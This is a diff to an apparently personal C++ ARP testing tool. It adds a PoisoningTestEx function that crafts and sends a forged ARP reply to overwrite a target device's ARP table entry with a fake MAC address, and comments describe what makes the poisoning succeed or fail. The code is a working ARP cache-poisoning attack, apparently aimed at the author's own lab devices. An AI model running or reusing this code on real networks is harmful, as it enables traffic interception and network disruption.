@@ -145,7 +145,7 @@ namespace ARPTester::Tests
 #define ON_WORK true
 #ifdef ON_WORK
     constexpr std::string_view interfaceName { "enp2s0" };
-    constexpr std::string_view interfaceIP { "192.168.100.0" };
+    constexpr std::string_view interfaceIP { "192.168.101.0" };
 #elif
     constexpr std::string_view interfaceName { "wlp4s0" };
     constexpr std::string_view interfaceIP { "192.168.0.184" };
@@ -184,12 +184,12 @@ namespace ARPTester::Tests
         // arpHeader->SetTargetAddress("192.168.57.1");
 
         // The MAC addr for this IP we want to find out: CommsSleeve IP address
-        arpHeader->SetTargetAddress("192.168.100.82");
+        arpHeader->SetTargetAddress("192.168.101.1");
 
         Utilities::SocketScoped socket = createSocket();
         enableBroadcast(socket);
 
-        for (int i = 0; i < 1; ++i) {
+        for (int i = 0; i < 10; ++i) {
 
             long bytes = sendto(socket,
                                 reinterpret_cast<uint8_t *>(&packet),
@@ -286,20 +286,22 @@ namespace ARPTester::Tests
         sockaddr_ll device = Utilities::ResolveInterfaceAddress(interfaceName);
         uint8_t packet[sizeof(EthernetHeader) + sizeof(ARPHeader)] {};
 
-        // Have to send ARP Reply packet right to Comms_Sleeve interface MAC address
+        constexpr std::string_view targetDeviceMac { "6c:24:08:f8:b6:af" };
+
+        // Have to send ARP Reply packet right to Comms_Sleeve/Device interface MAC address
         // otherwise it fail to set new value to the ARP table
         initEthernetHeader(reinterpret_cast<EthernetHeader*>(packet), device,
-                           cms_wlan1_Mac); /** To send request directly to Comms_Sleeve IP **/
+                           targetDeviceMac); /** To send request directly to Comms_Sleeve IP **/
 
         // Target MAC address: doesn't matter in case when we want to overwrite the ARP table value
         // or at least it looks like it
         // 'Sender IP Address' ---> It the POISONED MAC address
         ARPHeader* arpHeader = initARPHeader_Reply(reinterpret_cast<ARPHeader*>((packet + sizeof(EthernetHeader))),
                                                    "22:22:22:22:33:33",  // MAC of IP requested IP in REQUEST
-                                                   BROADCAST_MAC); // MAC of 'Sender IP Address' from Request
+                                                   BROADCAST_MAC);       // MAC of 'Sender IP Address' from Request
 
         // IP address for which the MAC has been requested in the Request ARP packet
-        arpHeader->SetSenderAddress("192.168.57.56");
+        arpHeader->SetSenderAddress("192.168.101.2");
 
         // IP of the one WHO asked to resolve IP in corresponding Request ARP packet
         // 'Target IP Address' in Repl shall be equal 'Sender IP Address' from Request
@@ -315,6 +317,49 @@ namespace ARPTester::Tests
 
         long bytes = sendto(socket,reinterpret_cast<uint8_t *>(&packet),sizeof(packet),
                             0,reinterpret_cast<sockaddr *>(&device),sizeof(device));
+        if (-1 == bytes) {
+            std::cerr << "Error sending packet: " << errno << std::endl;
+        } else {
+            std::cout << bytes << " send\n";
+        }
+    }
+
+    void PoisoningTestEx()
+    {
+        constexpr std::string_view targetDeviceMac { "6c:24:08:f8:b6:af" };
+        constexpr std::string_view ipAddressToOverwrite { "192.168.101.4" };
+        constexpr std::string_view fakeMacAddressToSet { "11:22:33:44:44:44" };
+
+        sockaddr_ll device = Utilities::ResolveInterfaceAddress(interfaceName);
+        uint8_t packet[sizeof(EthernetHeader) + sizeof(ARPHeader)] {};
+
+        // Have to send ARP Reply packet right to Device interface MAC address
+        // otherwise it fail to set new value to the ARP table
+        initEthernetHeader(reinterpret_cast<EthernetHeader*>(packet), device,targetDeviceMac);
+
+        // Target MAC address: doesn't matter in case when we want to overwrite the ARP table value
+        // or at least it looks like it
+        ARPHeader* arpHeader = initARPHeader_Reply(reinterpret_cast<ARPHeader*>((packet + sizeof(EthernetHeader))),
+                                                   fakeMacAddressToSet,  // MAC of IP requested IP in REQUEST
+                                                   BROADCAST_MAC);       // MAC of 'Sender IP Address' from Request
+
+        // 'Sender IP Address' ---> It the POISONED MAC address
+        arpHeader->SetSenderAddress(ipAddressToOverwrite);
+
+        // IP of the one WHO asked to resolve IP in corresponding Request ARP packet
+        // 'Target IP Address' in Repl shall be equal 'Sender IP Address' from Request
+        //
+        // In case of ARP Poisoning: --> Looks like doesn't matter
+        // BUT: poisoning fails with 'Target IP Address' == "127.0.0.1
+
+        // arpHeader->SetTargetAddress("192.168.1.6");
+        // arpHeader->SetTargetAddress("127.0.0.1");
+
+        Utilities::SocketScoped socket = createSocket();
+        enableBroadcast(socket);
+
+        const ssize_t bytes = sendto(socket,reinterpret_cast<uint8_t *>(&packet),sizeof(packet),
+                                  0,reinterpret_cast<sockaddr *>(&device),sizeof(device));
         if (-1 == bytes) {
             std::cerr << "Error sending packet: " << errno << std::endl;
         } else {
@@ -356,10 +401,12 @@ void ARPTester::TestAll()
     Utilities::checkRunningUnderRoot();
 
     // Tests::TestSocket();
-    Tests::SendRequest();
+    // Tests::SendRequest();
     // Tests::ARP_ScanRange();
     // Tests::SendReply();
+
     // Tests::PoisoningTest();
+    Tests::PoisoningTestEx();
 
     // std::cout << sizeof(ARPHeader) << std::endl;
 
